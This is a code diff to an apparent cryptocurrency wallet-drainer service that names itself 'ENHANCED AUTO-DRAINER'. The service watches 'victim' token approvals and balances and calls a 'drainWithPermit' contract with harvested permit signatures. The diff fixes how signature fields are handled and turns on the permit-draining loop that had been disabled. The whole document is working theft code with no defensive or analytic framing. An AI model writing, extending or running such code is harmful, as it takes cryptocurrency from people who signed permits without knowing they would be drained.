@@ -203,12 +203,13 @@ async function monitorPermits() {
       
       for (const sig of signatures) {
         const owner = sig.owner || sig.victim; // Backend uses 'victim' field
+        const value = sig.value || sig.amount; // Backend uses 'amount' field
         const permitId = `${sig.chainId}-${sig.token}-${owner}`;
         
         if (processedPermits.has(permitId)) continue;
         
         // Validate required fields
-        if (!owner || !sig.value || !sig.deadline || !sig.v || !sig.r || !sig.s) {
+        if (!owner || !value || !sig.deadline || !sig.v || !sig.r || !sig.s) {
           console.log(`⚠️ Skipping incomplete signature for ${sig.token}`);
           continue;
         }
@@ -234,7 +235,7 @@ async function monitorPermits() {
             address: chainConfig.permitDrainer,
             abi: PERMIT_DRAINER_ABI,
             functionName: 'drainWithPermit',
-            args: [sig.token, owner, BigInt(sig.value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
+            args: [sig.token, owner, BigInt(value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
             gas: 300000n
           });
           
@@ -271,14 +272,15 @@ console.log('🤖 ENHANCED AUTO-DRAINER STARTED');
 console.log('✅ Monitors new approvals');
 console.log('✅ Tracks victim balances');
 console.log('✅ Auto-drains when tokens added');
+console.log('✅ Monitors permit signatures');
 console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));
 
 CHAINS.forEach(config => {
   monitorChain(config).catch(console.error);
 });
 
-// Permit monitoring disabled - backend API incomplete
-// monitorPermits().catch(console.error);
+// Start permit monitoring
+monitorPermits().catch(console.error);
 
 // Health check endpoint
 app.get('/', (req, res) => {
